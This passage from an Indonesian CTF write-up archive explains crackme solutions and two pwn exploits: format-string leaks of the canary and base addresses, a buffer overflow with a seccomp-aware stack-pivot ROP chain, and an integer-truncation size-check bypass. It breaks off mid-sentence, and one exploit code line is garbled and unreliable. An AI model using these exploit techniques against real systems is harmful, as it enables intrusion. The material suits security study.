# CTF Metaforsec Writeup Archive

13 challenge terselesaikan: Reverse Engineering, PWN, ICS/OT,
Cryptography, dan Misc/Blockchain. Tiap writeup ditulis pelan-pelan biar
istilah teknisnya dijelasin dulu pakai bahasa awam sebelum masuk ke
detail exploit / decode-nya, lengkap dengan PoC.

13 Challenges Solved 1,000 pts REDLIMIT{...}
[Repo:
00-D-CTF ↗](https://github.com/0xnhsec/00-D-CTF)

[Touch Me] Daftar Isi / Menu Writeup

DAFTAR ISI (13)

- 01 / REVERSE ENGINEERING

  - [WU-001 50 pts Rolling crack_easy](#sec-wu-001)
    - [Step 1 Cari data yang relevan](#step-1-cari-data-yang-relevan)
    - [Step 2 Baca alur transform-nya dari
      disassembly](#step-2-baca-alur-transform-nya-dari-disassembly)
    - [Step 3 Invert (balikin
      operasinya)](#step-3-invert-balikin-operasinya)
    - [Step 4 Verifikasi ke binary
      asli](#step-4-verifikasi-ke-binary-asli)
  - [WU-002 50 pts Three Stages crack_medium](#sec-wu-002)
    - [✅ Flag:
      REDLIMIT{tr1pl3_st4g3_x_4nt1d3bug_pl0t}](#flag-redlimittr1pl3_st4g3_x_4nt1d3bug_pl0t)
  - [WU-003 50 pts The Machine crack_hard](#sec-wu-003)
    - [✅ Flag:
      REDLIMIT{cu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3}](#flag-redlimitcu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3)

- 02 / PWN

  - [WU-004 50 pts mirage](#sec-wu-004)
    - [0. Recon awal](#0-recon-awal)
    - [1. Baca fungsi leaker() → ketemu bug #1 (Format
      String)](#1-baca-fungsi-leaker-ketemu-bug-1-format-string)
    - [2. Baca fungsi main() → ketemu bug #2 (Buffer
      Overflow)](#2-baca-fungsi-main-ketemu-bug-2-buffer-overflow)
    - [3. Cek Seccomp filter → kenapa gak bisa langsung
      system("/bin/sh")](#3-cek-seccomp-filter-kenapa-gak-bisa-langsung-systembinsh)
    - [4. Cari ROP gadget di libc yang
      dikasih](#4-cari-rop-gadget-di-libc-yang-dikasih)
    - [5. Masalah: ROP chain yang dibutuhkan
      kepanjangan](#5-masalah-rop-chain-yang-dibutuhkan-kepanjangan)
    - [6. Rakit exploit final (Python murni, tanpa
      pwntools)](#6-rakit-exploit-final-python-murni-tanpa-pwntools)
    - [7. Validasi sebelum dipakai ke server
      asli](#7-validasi-sebelum-dipakai-ke-server-asli)
    - [Ringkasan alur berpikir (kalau mau diulang dari
      nol)](#ringkasan-alur-berpikir-kalau-mau-diulang-dari-nol)
  - [WU-005 50 pts spiral Block Reader v2](#sec-wu-005)
    - [0. Bekal awal](#0-bekal-awal)
    - [1. Recon binary checksec &
      fungsi](#1-recon-binary-checksec-fungsi)
    - [2. Bug #1 Format string di
      leaker()](#2-bug-1-format-string-di-leaker)
    - [3. Bug #2 Overflow dengan validasi ukuran yang
      buggy](#3-bug-2-overflow-dengan-validasi-ukuran-yang-buggy)
    - [4. Ngukur offset buffer → canary → return
      address](#4-ngukur-offset-buffer-canary-return-address)
    - [5. Nyusun ROP chain dan kenapa harus lewat
      libc](#5-nyusun-rop-chain-dan-kenapa-harus-lewat-libc)
    - [6. Percobaan pertama GAGAL (dan
      kenapa)](#6-percobaan-pertama-gagal-dan-kenapa)
    - [7. Percobaan kedua fd di-hardcode, gagal lagi di
      remote](#7-percobaan-kedua-fd-di-hardcode-gagal-lagi-di-remote)
    - [8. Fix final ambil fd secara dinamis dari
      rax](#8-fix-final-ambil-fd-secara-dinamis-dari-rax)
    - [9. Kenapa saya bisa "yakin" tanpa akses ke server
      remote](#9-kenapa-saya-bisa-yakin-tanpa-akses-ke-server-remote)
    - [Ringkasan alur akhir](#ringkasan-alur-akhir)

- 03 / ICS · OT

  - [WU-006 50 pts PLC Konveyor](#sec-wu-006)
    - [Struktur file (garis besar)](#struktur-file-garis-besar)
    - [Ada 2 hal yang kelihatan seperti flag tapi cuma 1 yang
      asli](#ada-2-hal-yang-kelihatan-seperti-flag-tapi-cuma-1-yang-asli)
    - [Flag](#flag)
    - [Kenapa ini "masuk akal" sebagai teknik
      nyata?](#kenapa-ini-masuk-akal-sebagai-teknik-nyata)
    - [Ringkasan Pola (berlaku untuk kedua soal ICS/OT di
      atas)](#ringkasan-pola-berlaku-untuk-kedua-soal-icsot-di-atas)
  - [WU-007 50 pts Gardu 104](#sec-wu-007)
    - [Apa itu IEC 104, singkatnya](#apa-itu-iec-104-singkatnya)
    - [Cara nemuin flag-nya step by
      step](#cara-nemuin-flag-nya-step-by-step)
    - [Flag](#flag)
  - [WU-008 50 pts Instalasi Air](#sec-wu-008)
    - [✅ Flag:
      REDLIMIT{m0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n}](#flag-redlimitm0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n)

- 04 / CRYPTO

  - [WU-009 50 pts Sandi Garuda](#sec-wu-009)
    - [Deskripsi Challenge](#deskripsi-challenge)
    - [1. Analisis Source](#1-analisis-source)
    - [2. Membangun Relasi Matematis](#2-membangun-relasi-matematis)
    - [3. Proof of Concept (Solve
      Script)](#3-proof-of-concept-solve-script)
    - [4. Ringkasan Alur Serangan](#4-ringkasan-alur-serangan)
    - [Catatan Mitigasi](#catatan-mitigasi)
  - [WU-010 50 pts Overcooked](#sec-wu-010)
    - [✅ Flag:
      REDLIMIT{n0_sCr1pt_n33d3d_no_41_sl0p_}](#flag-redlimitn0_scr1pt_n33d3d_no_41_sl0p_)
  - [WU-011 50 pts 4xJump Shell](#sec-wu-011)
    - [✅ Flag:
      REDLIMIT{jUmp_1nt0_th3_p0w3rsh3ll_w0rld}](#flag-redlimitjump_1nt0_th3_p0w3rsh3ll_w0rld)

- 05 / MISC · BLOCKCHAIN

  - [WU-012 150 pts Geprek Chain](#sec-wu-012)
    - [1. Kenalan dulu sama soalnya](#1-kenalan-dulu-sama-soalnya)
    - [2. Pahami struktur satu blok](#2-pahami-struktur-satu-blok)
    - [3. (Opsional tapi disarankan) Validasi rantai
      dulu](#3-opsional-tapi-disarankan-validasi-rantai-dulu)
    - [4. Coba dekripsi genesis block (index 0) dan lihat
      jebakannya](#4-coba-dekripsi-genesis-block-index-0-dan-lihat-jebakannya)
    - [5. Dekripsi blok 1–7 dan susun
      fragmennya](#5-dekripsi-blok-17-dan-susun-fragmennya)
    - [6. Gabungkan sesuai urutan
      index](#6-gabungkan-sesuai-urutan-index)
    - [7. Flag final 🎉](#7-flag-final)
    - [Ringkasan singkat (kalau mau langsung
      praktik)](#ringkasan-singkat-kalau-mau-langsung-praktik)
  - [WU-013 300 pts Blockchain Rewardless](#sec-wu-013)
    - [✅ Flag:
      REDLIMIT{Min1ng_BL0cK_Pr00f_0f_Wo0rk_iS_Cr4ZzzY}](#flag-redlimitmin1ng_bl0ck_pr00f_0f_wo0rk_is_cr4zzzy)

01 / REVERSE ENGINEERING

WU-001 · 50 pts

# Rolling crack_easy

Reverse Engineering Easy

**Flag:** `REDLIMIT{r0ll1ng_x0r_1s_junk_f00d_f0r_ai}`

**Apa yang diberikan?** Satu binary ELF 64-bit, stripped (artinya semua
nama fungsi/variable udah dihapus compiler, jadi kita harus baca murni
dari alur instruksi assembly). Deskripsi soal bilang: ada satu fungsi
yang ngecek input kita, prosesnya "reversible per-byte transform" (bisa
dibalik), pake xor + key, tambah konstanta yang berubah tiap posisi,
sama bit-rotate.

**Apa maksudnya?** Program ini nyimpen "jawaban" (target) dalam bentuk
terenkripsi di dalam binary-nya sendiri. Setiap huruf yang kita ketik
bakal di-acak pake 3 operasi berurutan, terus hasilnya dibandingin sama
jawaban yang udah terenkripsi itu. Tugas kita: bongkar acakannya,
balikin urutan operasinya, biar dapet input asli yang bakal menghasilkan
hasil acakan yang sama persis kaya "jawaban" yang disimpen.

### Step 1 Cari data yang relevan

`strings` binary buat cari clue pesan sukses:

    Correct! that input IS the flag.

Dump `.rodata` (bagian binary yang isinya data statis kaya
string/array):

    2040: 73 33 63 72 33 74 5f 6b 33 79 00 ...      -> "s3cr3t_k3y" (KEY, 10 byte)
    2060: 12 f4 b2 a3 bd eb 0b 8c 0d 5b 55 6e 24 fd 07 ec
    2070: 8c 5d 15 8d ce b5 5e 7f 11 8e 40 f6 8a 58 b1 ef
    2080: 40 a9 23 d2 52 c2 eb 12 3a                      -> TARGET (41 byte, terenkripsi)

### Step 2 Baca alur transform-nya dari disassembly

Fungsi cek-nya (ketauan dari `objdump -d`) loop per-byte, isi alurnya:

    untuk tiap index i (0 sampai 40):
        c = 0x21 + 7*i              # konstanta beda tiap posisi, naik +7
        k = key[i % 10]             # key "s3cr3t_k3y" diulang tiap 10 karakter
        target[i] = rol( (input[i] ^ k) + c , 3 )   # xor, tambah, rotate-left 3 bit

**Kenapa harus dibaca urutannya persis?** Karena buat ngebalikin, urutan
operasinya harus DIBALIK juga kalau kebalik urutan invertnya, hasilnya
ngaco walau operasinya "keliatan" sama.

### Step 3 Invert (balikin operasinya)

``` python
key = b's3cr3t_k3y'
target = bytes.fromhex(
    '12f4b2a3bdeb0b8c0d5b556e24fd07ec'
    '8c5d158dceb55e7f118e40f68a58b1ef'
    '40a923d252c2eb123a'
)

def ror8(x, n):          # kebalikan dari rotate-left = rotate-right
    n %= 8
    return ((x >> n) | (x << (8 - n))) & 0xff

out = bytearray()
c = 0x21
for i, t in enumerate(target):
    r = ror8(t, 3)              # 1. balikin rotate
    v = (r - c) & 0xff          # 2. balikin +c
    p = v ^ key[i % 10]         # 3. balikin xor
    out.append(p)
    c = (c + 7) & 0xff

print(out.decode())
```

**Output:**

    REDLIMIT{r0ll1ng_x0r_1s_junk_f00d_f0r_ai}

### Step 4 Verifikasi ke binary asli

$ echo "REDLIMIT{r0ll1ng_x0r_1s_junk_f00d_f0r_ai}" | ./crack_easy
Correct! that input IS the flag.

    ✅ Flag: `REDLIMIT{r0ll1ng_x0r_1s_junk_f00d_f0r_ai}`

WU-002 · 50 pts

# Three Stages crack_medium

Reverse Engineering Medium

**Flag:** `REDLIMIT{tr1pl3_st4g3_x_4nt1d3bug_pl0t}`

**Apa yang diberikan?** Binary lain yang minta password 39 karakter, dan
katanya ada **"anti-debug"** kalau kita coba analisis pakai debugger
(tools buat "mengintip" program lagi jalan step-by-step, kayak `gdb`),
program otomatis ngerusak diri sendiri biar password yang benar pun
ditolak.

**Apa itu "anti-debug"?** Bayangin kalau kamu ngerjain ujian, terus
pengawas curiga kamu nyontek pakai kalkulator begitu dia nyalain
"alarm pendeteksi", jawaban di kertasmu otomatis berubah jadi acak.
Program ini punya trik serupa: dia manggil fungsi sistem bernama
`ptrace` yang bisa "ngendus" apakah dia lagi diawasi debugger. Kalau
iya, satu variabel penting diubah nilainya, bikin validasi password jadi
salah walau kita udah masukin password yang benar.

**Kenapa kita tetap bisa menang?** Karena saya **tidak menjalankan
programnya di debugger sama sekali** saya cuma **baca kode
assembly-nya secara statis** (kayak baca cetak biru tanpa menyalakan
mesinnya). Jadi trik anti-debug-nya nggak pernah ke-trigger.

**Bukti (PoC) 3 tahap validasi password yang saya temukan** (39
karakter dibagi 3 x 13):

| Tahap | Karakter ke- | Rumus pengolahan tiap huruf                                                    |
|-------|--------------|--------------------------------------------------------------------------------|
| 1     | 0–12         | putar-bit + XOR pakai tabel kecil + tambah posisi huruf                        |
| 2     | 13–25        | putar-bit + XOR angka tetap + kurang "angka berjalan" (naik tiap huruf sukses) |
| 3     | 26–38        | tambah angka tetap + XOR dengan kuadrat posisi huruf                           |

Tiap tahap punya "jawaban target" (nilai yang harus dicocokkan)
tersimpan sebagai tabel angka di dalam file binary-nya (bisa dibaca
langsung, nggak terenkripsi). Karena saya tahu rumus dan tahu targetnya,
saya tinggal **balikkan rumusnya** (kalau normalnya A→B, saya hitung
B→A) untuk tiap karakter, satu-satu, dari tahap 1 sampai 3.

**Bukti dijalankan ke binary aslinya:**

    $ echo 'REDLIMIT{tr1pl3_st4g3_x_4nt1d3bug_pl0t}' | ./crack_medium
    Access granted. The input is the flag.

### ✅ Flag: `REDLIMIT{tr1pl3_st4g3_x_4nt1d3bug_pl0t}`

---

WU-003 · 50 pts

# The Machine crack_hard

Reverse Engineering Hard

**Flag:** `REDLIMIT{cu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3}`

**Apa yang diberikan?** File binary (program `.exe`-nya Linux) yang
minta kita masukin password. Petunjuknya: di dalam program ini ada
**"mesin virtual" (VM) buatan sendiri** tiap karakter password yang
kita ketik akan diproses lewat serangkaian operasi matematika sebelum
dicek benar-salah.

**Apa maksudnya "mesin virtual buatan sendiri"?** Program biasa langsung
ngecek password pakai kode yang gampang dibaca (`if password == "xxx"`).
Di sini programnya lebih licik: dia bikin **bahasa pemrogramannya
sendiri** (cuma 7 "kata kerja"/instruksi) yang isinya dikaburkan (di-XOR
pakai angka `0x5A`), lalu dijalankan kayak "program di dalam program".
Ini bikin orang susah nge-reverse pakai tools otomatis biasa, kudu
dianalisis manual.

**Bukti (PoC) tabel 7 instruksi yang saya temukan** dari baca
instruksi mesin (assembly) programnya:

| Kode   | Artinya                                                      |
|--------|--------------------------------------------------------------|
| `0x9C` | Ambil 1 karakter berikutnya dari password yang kita ketik    |
| `0x3B` | XOR (operasi bit) dengan angka tertentu                      |
| `0x71` | Tambah dengan angka tertentu                                 |
| `0x2E` | Kurang dengan angka tertentu                                 |
| `0x64` | Putar bit ke kiri (rotate)                                   |
| `0xA7` | Kali dengan angka tertentu                                   |
| `0xD5` | Cek: hasil olahan tadi harus sama persis dengan nilai target |

Setelah "bahasa rahasia" ini di-decode (XOR balik pakai `0x5A`), saya
temukan programnya punya **46 blok instruksi berurutan** persis sama
dengan panjang password yang wajib (46 karakter). Tiap blok isinya:
"ambil 1 huruf → olah pakai beberapa operasi di atas → cek hasilnya".

**Kabar baiknya:** tiap blok itu **berdiri sendiri-sendiri** huruf
ke-1 nggak mempengaruhi pengecekan huruf ke-2, dst. Jadi saya nggak
perlu nebak 46 huruf sekaligus (yang mustahil), cukup coba 1 huruf per
blok dari 256 kemungkinan (`a`-`z`, `A`-`Z`, angka, simbol, dll) —
itungan cepat buat komputer.

**Bukti dijalankan ke binary aslinya:**

    $ echo 'REDLIMIT{cu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3}' | ./crack_hard
    VM accepted. Input is the flag.

### ✅ Flag: `REDLIMIT{cu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3}`

---

02 / PWN

WU-004 · 50 pts

# mirage

PWN Easy

Target: binary `mirage` + `libc.so.6` + `ld-linux-x86-64.so.2`
(loader) + `Dockerfile`. Tujuan: baca `flag.txt` yang ada di server
(bukan flag di binary itu cuma DECOY).

Alur besar exploitnya: **Format String Leak → Buffer Overflow → ROP
(bypass seccomp) → baca file**.

---

## 0. Recon awal

``` bash
file mirage libc_so.6 ld-linux-x86-64_so.2
readelf -h mirage | grep Type          # DYN (PIE)
readelf -l mirage | grep -E "GNU_STACK|GNU_RELRO"
nm mirage | grep -v ' U '              # lihat fungsi yang ada
strings -n 6 mirage                    # cari string menarik
```

Yang penting dari sini:

- Binary **PIE**, ada **canary** (stack protector aktif, keliatan dari
  fungsi `__stack_chk_fail`).
- Cuma ada 2 fungsi custom: `main` dan `leaker`.
- Ada string `"seccomp"` → berarti proses ini pasang **seccomp filter**
  (batasi syscall yang boleh dipakai).
- Ada string decoy: `DECOY{...}` ini jebakan, bukan flag asli.
- Dockerfile bilang jelas: **flag asli cuma ada di server**
  (`flag.txt`), dan libc+loader yang dikasih **sama persis** dengan yang
  dipakai server, jadi semua offset gadget yang kita hitung lokal
  **pasti valid** di remote.

---

## 1. Baca fungsi `leaker()` → ketemu bug #1 (Format String)

``` bash
objdump -d -M intel mirage --disassemble=leaker
```

Intinya `leaker()` melakukan:

``` c
void leaker(void) {
    char name[0xa0];
    printf("name> ");
    fgets(name, 0xa0, stdin);
    name[strcspn(name, "\n")] = 0;
    printf("hello, ");
    printf(name);   // <-- BUG: input user dipakai LANGSUNG sebagai format string!
}
```

`printf(name)` bukan `printf("%s", name)` artinya kalau kita kirim
`%p %p %p`, itu akan di-parse sebagai *format specifier* oleh `printf`.
Ini classic **format string vulnerability**, bisa dipakai buat **baca
isi stack** (canary, alamat PIE, alamat libc) tanpa perlu crash apapun.

### Cara cari offset yang tepat

Saya tidak nebak-nebak saya **jalankan binary-nya secara lokal**
(pakai loader & libc yang sama persis dengan yang dikasih ke kita), lalu
kirim payload `%1$p|%2$p|...|%N$p` dan lihat nilai apa yang keluar di
posisi berapa:

``` python
import subprocess, select, os
p = subprocess.Popen(['./ld.so', '--library-path', '.', './mirage_bin'],
                      stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
# ... kirim "%26$p|%27$p|%28$p|%29$p\n" sebagai nama, baca hasilnya
```

Dari percobaan berulang (canary itu random tiap proses, jadi saya ulang
beberapa kali untuk memastikan pola-nya konsisten):

| Offset  | Isinya                       | Ciri-ciri                                          |
|---------|------------------------------|----------------------------------------------------|
| `%27$p` | **Stack canary**             | selalu diakhiri byte `00` (ciri khas canary glibc) |
| `%29$p` | **Return address ke `main`** | `mirage_base + 0x14e6` (konstan tiap run)          |
| `%61$p` | **Alamat di dalam libc**     | `libc_base + 0x29f75` (konstan tiap run)           |

Karena offset relatif stack frame itu **tetap** (cuma nilai aslinya yang
di-random ASLR), begitu ketemu sekali, formula
`base = leaked_value - offset_konstan` akan selalu benar.

> **Kenapa bisa nemu offset ini?** Karena `leaker()` cuma `printf(name)`
> tanpa argumen tambahan. `printf` tetap butuh "isi" untuk tiap `%p`,
> jadi dia ambil dari register (`rsi,rdx,rcx,r8,r9`) lalu lanjut baca
> **stack** urut ke atas. Kebetulan setelah beberapa slot register,
> `printf` mulai membaca **buffer kita sendiri** (karena buffer itu ada
> di stack juga), baru setelah buffer kita habis dia lanjut membaca data
> asli di stack (canary, return address, dst).

---

## 2. Baca fungsi `main()` → ketemu bug #2 (Buffer Overflow)

    lea rdi,[rip+...]   ; "in> "
    call printf@plt
    lea rsi,[rsp+0xa0]  ; buffer
    mov edx,0xb0        ; read 176 byte!
    mov edi,0
    call read@plt

Buffer di-alokasikan di `rsp+0xa0`, tapi `read()` diminta baca **0xb0
(176) byte** padahal jarak dari buffer ke canary cuma **72 byte**. Ini
classic **stack buffer overflow**:

    [0:72)   junk / bebas isi apa saja
    [72:80)  harus PERSIS = canary yang sudah kita bocorkan (kalau salah -> __stack_chk_fail -> crash)
    [80:88)  padding 8 byte (bebas, hasil dari tidak ada `push rbp`)
    [88:96)  RETURN ADDRESS -> disini kita mulai kontrol eksekusi
    [96:176) sisa 80 byte -> bisa dipakai buat ROP chain tahap awal

Total 176 byte pas.

---

## 3. Cek Seccomp filter → kenapa gak bisa langsung `system("/bin/sh")`

Di awal `main()` ada kode yang membangun **BPF seccomp filter** secara
manual (baris-baris `mov WORD/DWORD PTR [rsp+...]`). Saya decode manual
struktur `sock_filter` (8 byte per entry: `code(2) jt(1) jf(1) k(4)`),
hasilnya syscall yang **diizinkan**:

    read, write, open, openat, close, lseek, fstat, newfstatat, brk, exit, exit_group

**`execve` TIDAK ada di daftar** → strategi "ret2libc pakai
`system()`/shell" **tidak akan jalan** walaupun kita berhasil kontrol
RIP. Jadi strateginya harus: **ROP murni pakai syscall langsung** untuk
`open("flag.txt")` → `read()` isinya → `write()` ke stdout.

---

## 4. Cari ROP gadget di libc yang dikasih

Karena tidak ada `pwntools`/`ROPgadget` di environment saya (tidak ada
akses internet buat install), saya cari gadget dengan **scan byte
pattern manual** langsung di file `libc.so.6`:

``` python
with open('libc.so.6','rb') as f:
    data = f.read()

text_start, text_end = 0x28400, 0x28400 + 0x1671ad  # dari readelf -S .text

def find_all(pattern):
    res, s = [], text_start
    while True:
        idx = data.find(pattern, s, text_end)
        if idx == -1: break
        res.append(idx); s = idx + 1
    return res

print(find_all(b'\x5f\xc3'))        # pop rdi; ret
print(find_all(b'\x5e\xc3'))        # pop rsi; ret
print(find_all(b'\x5a\xc3'))        # pop rdx; ret
print(find_all(b'\x58\xc3'))        # pop rax; ret
print(find_all(b'\x0f\x05\xc3'))    # syscall; ret
print(find_all(b'\x5c\xc3'))        # pop rsp; ret  <- buat "stack pivot"
```

Gadget yang dipakai (offset dari base libc):

    pop rdi; ret   -> 0x2a9b7
    pop rsi; ret   -> 0x29e29
    pop rdx; ret   -> 0x96372
    pop rax; ret   -> 0x44386
    syscall; ret   -> 0x926e2
    pop rsp; ret   -> 0x2861a

> Catatan: cara verifikasinya bukan pakai `objdump` biasa (karena
> `objdump` disassemble dari awal section, jadi kalau gadget kita
> "nyempil" di tengah instruksi lain, hasil tampilannya bisa
> nyasar/salah). Cara yang benar: **baca byte mentahnya langsung** di
> offset itu kalau bytenya memang `5f c3`, maka begitu CPU eksekusi
> mulai persis di alamat itu, itu **pasti** `pop rdi; ret`, gak peduli
> instruksi "aslinya" itu apa di konteks lain.

---

## 5. Masalah: ROP chain yang dibutuhkan kepanjangan

Ruang ROP yang kita punya dari overflow cuma **80 byte (10 qword)**
setelah return address tidak cukup buat chain lengkap
(`open`+`read`+`write`+`exit` butuh ~32 qword).

**Solusi: Stack Pivot 2 tahap.**

- **Tahap 1** (muat di 11 slot yang tersedia): panggil
  `read(0, alamat_bss, 0x400)` untuk menampung ROP chain **yang lebih
  panjang**, lalu `pop rsp; ret` supaya RSP pindah ke alamat `.bss`
  tadi.
- **Tahap 2**: begitu RSP sudah dipindah, `ret` berikutnya otomatis
  "memakan" data yang baru saja kita `read()`-kan sebagai gadget-gadget
  berikutnya jadi ROP chain-nya bisa sepanjang apapun, dikirim lewat
  koneksi socket yang sama, tanpa batas 80 byte tadi.

<!-- -->

    Stage 1 (176 byte, isi buffer overflow):
      junk(72) + canary(8) + junk(8) +
      pop_rdi, 0                 ; rdi = 0 (stdin)
      pop_rsi, BSS_ADDR          ; rsi = tujuan
      pop_rdx, 0x400             ; rdx = size
      pop_rax, 0                 ; rax = sys_read
      syscall                    ; read(0, BSS_ADDR, 0x400)  <- nunggu data stage2
      pop_rsp, BSS_ADDR          ; PIVOT!

    Stage 2 (dikirim abis stage1, ditulis ke BSS_ADDR oleh syscall read() di atas):
      pop_rdi, alamat_string_"flag.txt"
      pop_rsi, 0
      pop_rdx, 0
      pop_rax, 2                 ; sys_open
      syscall                    ; open("flag.txt", O_RDONLY) -> fd (asumsi fd=3)

      pop_rdi, 3
      pop_rsi, BSS_FLAGBUF
      pop_rdx, 0x200
      pop_rax, 0                 ; sys_read
      syscall                    ; read(3, buf, 0x200)

      pop_rdi, 1
      pop_rsi, BSS_FLAGBUF
      pop_rdx, 0x200
      pop_rax, 1                 ; sys_write
      syscall                    ; write(1, buf, 0x200)  -> FLAG KELIHATAN!

      pop_rdi, 0
      pop_rax, 231                ; sys_exit_group
      syscall

String `"flag.txt"` sendiri sudah ada tertanam di binary (variabel
global `fname`, di `.data` offset `0x4020`) jadi gak perlu bikin
string baru, tinggal pakai alamatnya (`mirage_base + 0x4020`).

Alamat scratch buat chain tahap 2 dan buffer isi flag, saya pakai daerah
`.bss` yang writable (`mirage_base + 0x4090` dan `+0x4300`) dicek dulu
dengan `readelf -l` supaya yakin daerah itu benar-benar mapped RW dan
cukup luas.

---

## 6. Rakit exploit final (Python murni, tanpa pwntools)

Karena sandbox saya gak ada akses internet buat `pip install pwntools`,
saya tulis versi manual:

- `Conn` class: bisa jalan lewat **subprocess pipe** (buat testing
  lokal) atau **socket TCP** (buat ke server asli) logic exploit-nya
  identik untuk keduanya.
- Kirim `"%27$p|%29$p|%61$p\n"` → parse hasilnya jadi `canary`,
  `mirage_base`, `libc_base`.
- Susun `stage1` (176 byte, harus PAS) dan `stage2` (rangkaian gadget di
  atas).
- Kirim `stage1`, tunggu sebentar, kirim `stage2`, baca hasilnya itu
  isi `flag.txt`.

``` python
def p64(x): return struct.pack(' flag.txt   # bikin flag palsu
python3 exploit.py --local                            # jalanin lewat subprocess, bukan socket
```

Begitu keluar `CTF{local_test_flag_not_real}` di output, artinya
**seluruh chain sudah benar** (leak offset, canary match, gadget
address, pivot, syscall) tinggal ganti target ke
`--host  --port ` dan jalankan ke server sungguhan.

---

## Ringkasan alur berpikir (kalau mau diulang dari nol)

1.  `file` + `readelf` + `nm` + `strings` → kenali proteksi & fungsi
    yang ada.
2.  Baca disassembly tiap fungsi custom satu-satu → cari pola bug yang
    familiar (`printf(var)` = format string, `read()` dengan size lebih
    besar dari jarak ke canary = overflow).
3.  Kalau ada seccomp → **selalu decode filter-nya**, jangan asumsi bisa
    `execve`.
4.  Cari offset leak dengan **coba-coba terkontrol** di binary lokal
    (`%N$p` satu-satu / beberapa sekaligus), verifikasi konsisten di
    beberapa kali run.
5.  Cari gadget dengan scan byte pattern langsung di libc yang dikasih
    (bukan nebak dari libc lain).
6.  Kalau ruang ROP kurang → **stack pivot** ke daerah writable (`.bss`)
    buat nampung chain lebih panjang.
7.  **Selalu tes lokal dulu** (buat flag.txt palsu) sebelum coba ke
    server supaya kalau gagal, tahu itu salah logic (bisa didebug)
    bukan salah koneksi/network.

WU-005 · 50 pts

# spiral Block Reader v2

PWN Medium

## 0. Bekal awal

Diberi 4 file: - `spiral` binary target (PIE, x86-64) - `libc_so.6`,
`ld-linux-x86-64_so.2` libc & loader yang **di-pin** persis sama
dengan yang dipakai server (ini kunci: artinya semua offset
gadget/simbol yang kita ukur di libc ini pasti identik di remote) -
`Dockerfile` buat lihat bagaimana binary dijalankan
(`socat ... EXEC:'./ld-linux-x86-64.so.2 --library-path . ./spiral',stderr`)

Clue dari soal:

> "Ukuran yang kamu kira aman ternyata tidak. Sandbox menutup satu pintu
> yang biasanya terbuka."

Dua clue penting sudah dikasih di depan: ada bug di **validasi ukuran**,
dan **sandbox (seccomp)** menutup sesuatu yang "biasanya terbuka" —
nanti kepakai di step paling akhir.

## 1. Recon binary checksec & fungsi

    NX      : enabled   (GNU_STACK RW, no E)
    PIE     : enabled
    RELRO   : full (BIND_NOW)
    Canary  : ada (__stack_chk_fail dipanggil)

Fungsi user cuma ada dua: `leaker()` dan `main()`. Nama fungsi `leaker`
sudah kasih hint gede: fungsi ini didesain buat "membocorkan" sesuatu.

Disassembly `main()` alurnya: 1. `prctl(PR_SET_NO_NEW_PRIVS, 1)` 2.
`prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &sock_fprog)` → **install
seccomp BPF filter** 3. `puts("Spiral Block Reader v2")` 4. panggil
`leaker()` 5. `printf("blocks(4 bytes)> ")` 6. `read(0, &size, 4)` —
baca 4 byte mentah jadi integer ukuran 7. cek validitas ukuran (nanti
dibahas) 8. kalau valid: `read(0, buf, size*64)` ke buffer di stack 9.
cek stack canary, `ret`

## 2. Bug #1 Format string di `leaker()`

``` c
printf("name> ");
fgets(buf, 0xa0, stdin);
strcspn(buf, "\n");            // trim newline
printf("hello, ");
printf(buf);                   // <-- BUG: buf jadi FORMAT STRING, bukan argumen!
```

`buf` yang isinya full dikontrol user langsung dipakai sebagai **format
string** ke `printf`. Ini classic **format string vulnerability** → bisa
dipakai buat *arbitrary read* dari stack (leak alamat) via `%p`/`%x`,
bahkan *arbitrary write* via `%n` (nggak dipakai di sini, cukup baca
aja).

Karena `buf` juga fisiknya ada **di stack yang sama** yang dibaca
`printf` sebagai vararg spill area, kita bisa pakai *positional
specifier* `%N$p` buat baca qword ke-N dari titik itu termasuk
data-data "tetangga" `buf` seperti: - canary stack - return address
(yang balik ke `main`, bocorin base PIE) - sisa-sisa alamat libc dari
pemanggilan fungsi sebelumnya

### Cara nemu index yang pas (`%N$p`)

Saya nggak nebak-nebak manual saya **compile & jalankan
binary+libc+ld.so yang di-upload persis secara lokal** di sandbox saya
(`./ld.so --library-path . ./spiral`), lalu brute-force satu-satu index
`%1$p` sampai `%40$p`, sambil baca `/proc//maps` di tengah eksekusi
(proses saya jeda pas dia lagi nunggu input kedua) buat tahu base
address `spiral` dan `libc` saat itu.

Dengan itu ketemu pola yang **konsisten lintas run** (base beda-beda
tiap run karena ASLR, tapi *offset* dari base selalu sama):

| index   | isi                                      | rumus                        |
|---------|------------------------------------------|------------------------------|
| `%21$p` | alamat di dalam libc                     | `libc_base = leak - 0x8224a` |
| `%27$p` | stack canary (selalu diakhiri byte `00`) | langsung dipakai apa adanya  |
| `%29$p` | return address `leaker()` → `main()`     | `pie_base = leak - 0x14c5`   |

Payload leak: `%21$p|%27$p|%29$p\n` dikirim sebagai "nama".

## 3. Bug #2 Overflow dengan validasi ukuran yang buggy

``` c
read(0, &size, 4);                 // size: user-controlled, 32-bit mentah
uint32_t x = size << 6;            // x = size * 64
if ((uint16_t)(x - 1) > 0x3f)      // <-- BUG DI SINI
    goto too_big;                  // print pesan error, skip overflow read
read(0, buf, x);                   // ini yang overflow, tapi cuma sampai sini kalau lolos cek
```

Niat programmer: batasi `size` supaya `size*64 <= 64` (yaitu
`size <= 1`), karena cuma **low 16 bit** dari `(size*64 - 1)` yang
dicek, bukan full 32-bit-nya. Ini bug klasik **integer truncation**.

Karena hasil `size*64` di-`mod 2^32` lalu **cuma diperiksa 16 bit
terendahnya**, kita bisa cari `size` sedemikian sehingga: -
`x = size*64` **besar** (untuk overflow buffer sampai jauh,
ratusan/ribuan byte) - tapi `x mod 65536` tetap jatuh di rentang `1..64`
(biar lolos pengecekan)

Saya coba: `size = 4097` (`0x1001`) →

    x = 4097 * 64 = 262208 = 0x40040
    x mod 65536   = 0x40   = 64   ✅ masuk rentang [1,64]

Artinya validasi **lolos**, tapi `read()` kedua tetap dikasih kapasitas
**262.208 byte** jauh lebih dari cukup buat overflow return address
dan nyisip ROP chain panjang.

*(Cara nemu angka ini bukan hitung manual di kepala saya tulis sedikit
